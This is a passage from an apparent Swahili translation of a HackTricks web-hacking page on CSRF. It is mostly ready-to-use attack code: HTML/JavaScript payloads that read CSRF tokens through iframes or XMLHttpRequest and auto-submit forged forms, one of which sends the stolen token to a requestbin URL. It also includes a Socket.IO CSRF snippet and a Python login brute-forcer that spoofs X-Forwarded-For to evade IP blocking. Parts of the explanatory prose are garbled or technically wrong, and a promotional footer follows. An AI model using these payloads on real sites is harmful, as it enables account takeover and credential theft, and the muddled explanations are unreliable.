3. Katika ukurasa wa "attacker.html", ongeza iframe ambayo itaelekeza kwenye ukurasa unaotumia ulinzi wa CSRF. Kwa mfano:

```html
<iframe src="https://www.example.com/protected-page"></iframe>
```

4. Ongeza fomu ndani ya iframe ambayo itatuma ombi la POST kwa ukurasa unaotumia ulinzi wa CSRF. Fomu hii inapaswa kuwa na vitu vyote vinavyohitajika kwa ombi la POST, pamoja na Kitufe cha CSRF. Kwa mfano:

```html
<iframe src="https://www.example.com/protected-page">
  <form action="https://www.example.com/protected-page" method="POST">
    <input type="hidden" name="csrf_token" value="chukua_kitufe_cha_csrf_hapa">
    <!-- Ongeza vitu vingine vya fomu hapa -->
    <input type="submit" value="Tuma">
  </form>
</iframe>
```

5. Badilisha "chukua_kitufe_cha_csrf_hapa" na Kitufe cha CSRF halisi ambacho unataka kutumia.
6. Mara tu mtumiaji anapofungua ukurasa wa "attacker.html" katika kivinjari chake, iframe itaelekeza kwenye ukurasa unaotumia ulinzi wa CSRF na fomu itatuma ombi la POST lenye Kitufe cha CSRF kilichochukuliwa.
7. Ikiwa ombi la POST linafanikiwa, unaweza kupata udhibiti wa akaunti ya mtumiaji au kufanya shughuli zingine zinazohusiana na ombi hilo.

Ni muhimu kutambua kuwa njia hii inaweza kuwa na matokeo mabaya na inaweza kuwa kinyume cha sheria ikiwa hutumii kwa idhini ya mmiliki wa ukurasa unaotumia ulinzi wa CSRF. Kwa hivyo, tumia maarifa haya kwa uwajibikaji na kwa madhumuni ya kujifunza tu.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Wizi wa kitufe na kutuma kwa kutumia iframes 2**

Iframes ni vitu vinavyoruhusu kuweka tovuti ndani ya tovuti nyingine. Kwa kutumia mbinu hii, unaweza kuiba kitufe cha uthibitishaji (token) kutoka kwa mtumiaji na kisha kutuma kitufe hicho kwa kutumia iframes mbili.

Hatua zifuatazo zinahitajika kutekeleza mbinu hii:

1. Tengeneza tovuti ya kudanganya: Unda tovuti inayofanana na tovuti halisi ambayo mtumiaji anatumia. Tovuti hii ya kudanganya itakuwa na iframes mbili.

2. Weka iframes: Weka iframes mbili kwenye tovuti ya kudanganya. Iframe ya kwanza itaelekeza kwenye tovuti halisi ambayo mtumiaji anatumia, na iframe ya pili itaelekeza kwenye tovuti yako ya kudanganya.

3. Pata kitufe cha uthibitishaji: Tumia JavaScript kwenye tovuti yako ya kudanganya ili kuiba kitufe cha uthibitishaji kutoka kwa tovuti halisi. Unaweza kutumia njia kama vile kuvinjari kwa DOM au kuiba kitufe cha uthibitishaji kutoka kwa fomu ya kuingia.

4. Tuma kitufe cha uthibitishaji: Baada ya kuiba kitufe cha uthibitishaji, litume kwa kutumia iframes mbili. Iframe ya kwanza itatumwa kwa tovuti halisi ili kuiga shughuli ya mtumiaji, na iframe ya pili itatumwa kwa tovuti yako ya kudanganya ili kupeleka kitufe cha uthibitishaji.

Kwa njia hii, unaweza kuiba kitufe cha uthibitishaji kutoka kwa mtumiaji na kisha kutumia kitufe hicho kufanya shughuli zisizo halali kwa niaba yake. Ni muhimu kutambua kuwa mbinu hii inategemea udanganyifu na inaweza kuwa kinyume cha sheria.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTSteal CSRF token na Ajax na tuma posti na fomu**

Unapotaka kutekeleza shambulio la CSRF (Cross-Site Request Forgery), moja ya hatua muhimu ni kuiba tokeni ya CSRF. Kwa kufanya hivyo, unaweza kutumia njia ya Ajax na kutuma ombi la POST kwa kutumia fomu.

Hapa kuna hatua za kufanya hivyo:

1. Tumia JavaScript ili kuunda ombi la Ajax ambalo litapata tokeni ya CSRF kutoka kwa ukurasa wa lengo.
2. Baada ya kupata tokeni ya CSRF, tumia JavaScript kuunda fomu mpya na weka tokeni hiyo kama thamani ya uwanja wa fomu.
3. Tumia JavaScript kuwasilisha fomu hiyo kwa kutuma ombi la POST kwa ukurasa wa lengo.

Hapa kuna mfano wa namna ya kutekeleza hatua hizi:

```html
<script>
    // Hatua ya 1: Pata tokeni ya CSRF
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/get_csrf_token', false);
    xhr.send();
    var csrfToken = xhr.responseText;

    // Hatua ya 2: Unda fomu mpya na weka tokeni ya CSRF
    var form = document.createElement('form');
    form.setAttribute('method', 'POST');
    form.setAttribute('action', '/target_page');
    var csrfField = document.createElement('input');
    csrfField.setAttribute('type', 'hidden');
    csrfField.setAttribute('name', 'csrf_token');
    csrfField.setAttribute('value', csrfToken);
    form.appendChild(csrfField);

    // Hatua ya 3: Tuma ombi la POST kwa ukurasa wa lengo
    document.body.appendChild(form);
    form.submit();
</script>
```

Kwa kufuata hatua hizi, unaweza kuiba tokeni ya CSRF na kutumia ombi la POST kwa ukurasa wa lengo. Hii inaweza kusababisha shambulio la CSRF ambapo vitendo vya mtumiaji vinaweza kutekelezwa bila idhini yake. Ni muhimu kutambua kuwa shambulio la CSRF linaweza kuwa na athari mbaya, kwa hivyo ni muhimu kuchukua hatua za kutosha za usalama ili kuzuia shambulio hili.
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF na Socket.IO

CSRF (Cross-Site Request Forgery) ni njia ya shambulio ambapo mtu mwingine anaweza kutumia uwakilishi wa mtumiaji ulioidhinishwa kufanya vitendo visivyoidhinishwa kwenye tovuti fulani. Shambulio la CSRF linaweza kutokea wakati mtumiaji anayetembelea tovuti inayoshambuliwa ana uwakilishi wa mtumiaji ulioidhinishwa kwenye tovuti nyingine.

Socket.IO ni mfumo wa programu-jalizi wa Node.js ambao hutoa mawasiliano ya wakati halisi kati ya seva na wateja. Inatumika sana katika maombi ya wavuti yanayohitaji mawasiliano ya wakati halisi, kama vile mazungumzo ya moja kwa moja na programu za michezo.

Kwa kuzingatia hilo, shambulio la CSRF linaweza kutokea katika programu-jalizi ya Socket.IO ikiwa hatua sahihi za usalama hazijachukuliwa. Ili kujilinda dhidi ya shambulio la CSRF katika Socket.IO, unaweza kuzingatia hatua zifuatazo:

1. Tumia njia ya uthibitishaji kama vile JWT (JSON Web Tokens) ili kuhakikisha kuwa kila ombi linakuwa na uwakilishi wa mtumiaji ulioidhinishwa.
2. Tumia kichujio cha kuingiza kwenye seva ili kuhakikisha kuwa ombi linatoka kwa chanzo sahihi.
3. Tumia kuki za HTTP (HTTP cookies) kwa uwakilishi wa mtumiaji na hakikisha kuwa kuki hizo zinawekwa kwa usalama (secure) na zinazuiliwa kutoka kwa kufikiwa na skripti za upande wa mteja (client-side scripts).

Kwa kuzingatia hatua hizi za usalama, unaweza kuzuia shambulio la CSRF katika programu-jalizi ya Socket.IO na kuhakikisha kuwa mawasiliano yako ya wakati halisi ni salama na salama kutoka kwa shambulio lolote la mtu wa tatu.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Kuvunja Nguvu ya Kuingia

Msimbo huu unaweza kutumika kuvunja nguvu ya fomu ya kuingia kwa kutumia ishara ya CSRF (Pia inatumia kichwa cha habari X-Forwarded-For kujaribu kuepuka uwezekano wa kuzuia IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Vifaa <a href="#vifaa" id="vifaa"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Marejeo

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa bug bounty!

**Machapisho ya Udukuzi**\
Shiriki na yaliyomo yanayochunguza msisimko na changamoto za udukuzi

**Habari za Udukuzi za Waktu Halisi**\
Kuwa na habari za sasa katika ulimwengu wa udukuzi kupitia habari na ufahamu wa wakati halisi

**Matangazo ya Hivi Karibuni**\
Baki na habari za hivi karibuni kuhusu bug bounty mpya zinazoanzishwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!

<details>

<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
